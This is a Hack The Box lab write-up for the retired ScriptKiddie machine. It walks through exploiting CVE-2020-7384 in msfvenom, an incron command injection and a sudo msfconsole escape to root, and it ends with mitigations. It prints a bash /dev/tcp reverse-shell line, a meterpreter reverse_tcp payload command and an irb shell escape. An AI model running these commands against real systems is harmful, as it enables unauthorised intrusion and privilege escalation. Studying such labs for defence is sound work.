---
machine: ScriptKiddie
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, msfvenom, cve-2020-7384, command-injection, incron, sudo, privesc]
---

# ScriptKiddie — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Port `5000` serves a site with "hacker" utilities: an `nmap` scanner, a `searchsploit` lookup and a `msfvenom` payload generator that accepts a user-uploaded template. The Metasploit version is vulnerable to CVE-2020-7384: a malicious APK template runs commands when processed. The shell is `kid`'s. A log file `kid` can write is consumed by one of `pwn`'s scripts through `incron`, and its content is interpolated into a command line, yielding a shell as `pwn`. `pwn` may run `msfconsole` with `sudo` and no password; its console gives root.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,5000 <IP>
```

- `22` OpenSSH 8.2p1 Ubuntu 4ubuntu0.1.
- `5000` Werkzeug httpd 0.16.1 (Python 3.8.5).
- No other services.

## Enumeration

The site has three sections: IP scanning with `nmap`, exploit search and payload generation. The payload form lets the user pick an OS (Windows, Linux, Android), set `LHOST` and upload a template; the server calls `msfvenom` with those values and returns the generated file.

The page shows the Metasploit version and the scan output. Scanning `127.0.0.1` confirms the server runs `nmap` locally.

## Foothold

CVE-2020-7384 allows command injection in an APK template. An APK with the command embedded in the vulnerable field is built, uploaded as a template and the payload generated:

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -x template.apk -o out.apk
```

While processing the template, `msfvenom` runs the command and returns a shell as `kid`:

```text
<COMMAND>; bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

## Lateral movement

`kid` has no direct access to another host. Their home holds the application logs and a `hackers` file written on every attempt. `pwn` runs a `scanlosers.sh` script through `incron` when the file changes, and the content is used unsanitized in a command line.

A line with an injection is written to the watched file and, when the event fires, the command runs as `pwn`.

## Privilege escalation

`sudo -l` shows `pwn` may run `msfconsole` as root without a password. The Metasploit console can run system commands; with `irb` or `-x` a shell is spawned:

```bash
sudo msfconsole -q -x 'irb'
# inside irb:
system("/bin/sh")
```

The resulting shell is root's.

## Evidence

- Werkzeug on `5000` with the payload generator.
- APK template carrying the injection and a shell as `kid`.
- Modified `hackers` file and execution as `pwn`.
- `sudo -l` with passwordless `msfconsole`.
- `system("/bin/sh")` from `irb` and `id` with UID 0.

## Lessons learned

- A tool processing user files (msfvenom, ffmpeg, ImageMagick) is attack surface.
- An unauthenticated payload generator is RCE by design unless isolated.
- `incron` runs scripts with file content; unsanitized, it is command injection.
- `sudo` on `msfconsole` equals `sudo` on a shell.
- Pentest tooling should run in unprivileged containers.

## Mitigations and detection

- Update Metasploit and disallow user-uploaded templates.
- Run `msfvenom` in an ephemeral container with no network and no privileges.
- Validate and escape content consumed by `incron` scripts.
- Never grant `sudo` on interactive consoles; use a wrapper with fixed arguments.
- Alert on `msfvenom` processes spawning shells and on writes to watched files.
- Keep the site confined to the lab network.

## References

- [0xdf — ScriptKiddie](https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html)
- [IppSec — ScriptKiddie](https://www.youtube.com/watch?v=Yn3iGF8xMQI)
- [Hack The Box — ScriptKiddie](https://app.hackthebox.com/machines/scriptkiddie)
- [NVD — CVE-2020-7384](https://nvd.nist.gov/vuln/detail/CVE-2020-7384)
- [Exploit-DB — msfvenom APK template](https://www.exploit-db.com/exploits/49491)
